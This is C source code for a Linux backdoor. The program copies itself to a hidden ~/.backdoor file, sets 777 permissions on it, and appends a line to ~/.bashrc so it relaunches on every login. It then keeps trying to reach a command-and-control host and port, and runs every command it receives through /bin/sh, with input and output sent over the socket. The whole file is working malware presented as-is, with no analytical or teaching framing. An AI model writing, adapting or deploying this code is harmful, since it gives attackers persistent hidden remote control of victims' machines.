#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define BUFFER_SIZE 1024
#define WAIT_TIME 30

char const* host = "127.0.0.1";
char const* port = "4444";


void setup(char* filePath);
void run();

int main(int argc, char* argv[]) {

    if (argc == 3) {
        host = argv[1];
        port = argv[2];
    }
    
    setup(argv[0]);
    run();

    return 0;
}

void setup(char *filePath) {

    char* homeDir = getenv("HOME");
    char bashrcFile[128];
    char destFile[128];
    char command[BUFFER_SIZE];

    sprintf(bashrcFile, "%s/%s", homeDir, ".bashrc");
    sprintf(destFile, "%s/%s", homeDir, ".backdoor");
    sprintf(command, "%s %s %s\n", destFile, host, port);

    if (strcmp(destFile, filePath) == 0){       //already setup
        
        return;

    }

    //move file to destFile to hide
    if (rename(filePath, destFile) == -1){
        
        printf("Move file to destFile Failed");
        return;

    }
    
    if (chmod(destFile,  S_IRWXU | S_IRWXO | S_IRWXG ) == -1){

        printf("Permission 777 Failed");
        return;

    }


    FILE *fs = fopen(bashrcFile, "a");  //pointer to file stream
    if (fs == NULL){

        printf("Cant open bashrc file");
		return;

	}

    //write to .bashrc 
    fwrite(command, strlen(command), 1, fs);

    fclose(fs);

}

int connectServer(){

    struct addrinfo hints;
    struct addrinfo *result;
    struct sockaddr_in sockAddr;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(host, port, &hints, &result) != 0){

        printf( "GetAddrInfo Failed!\n" );
		return -1;

	}

    int sock =  socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sock == -1){

        printf( "Create socket Failed!\n" );
        freeaddrinfo(result);
		return -1;

    }

    if (connect(sock, result->ai_addr, result->ai_addrlen) == -1){

        freeaddrinfo(result);
        close(sock);
        return -1;

    }

    freeaddrinfo(result);
    return sock;

}
 void run() {

    //try connect to C&C server
    int sock = -1;

    while ( (sock = connectServer()) == -1){

        sleep(WAIT_TIME);

    }

    printf("Connect to C&C\n");

    //receive command to execute
    char cmd[BUFFER_SIZE];
    char const* prompt = "cmd: ";
    int promptSize = 5;
    while (true) {

        int ret = write(sock, prompt, promptSize);
        if (ret == -1){

            printf("Write failed!\n");
            break;

        } else if (ret == 0){

            printf ("Stream socket peer shutdown!\n");

        }

        ret = recv(sock, cmd, BUFFER_SIZE, 0);
        if ( ret == -1){

            printf("Receive failed!\n");
            break;

        }
        else if ( ret == 0){

            printf ("Stream socket peer shutdown!\n");
            break;

        }
        
        cmd[ret]='\x00';
        printf("Server requires: %s\n",cmd);

        //create new process to execute the command
        int pid = fork();

        if (pid == -1){

            printf("Fork() failed!\n");

        } else if (pid == 0) { // in child process

            //redirect stdin, stdout, stderr through socket
            dup2(sock,0);
            dup2(sock,1);
            dup2(sock,2);

            //execute cmd
            //execve("/bin/bash", cmd, NULL);
            execl("/bin/sh", "sh", "-c", cmd, (char*)NULL);
            break;

        } else {

            //suspend execution until the child specified by pid terminates
            waitpid(pid, NULL, 0);
            
        }
    }

    close (sock);
    return;
}
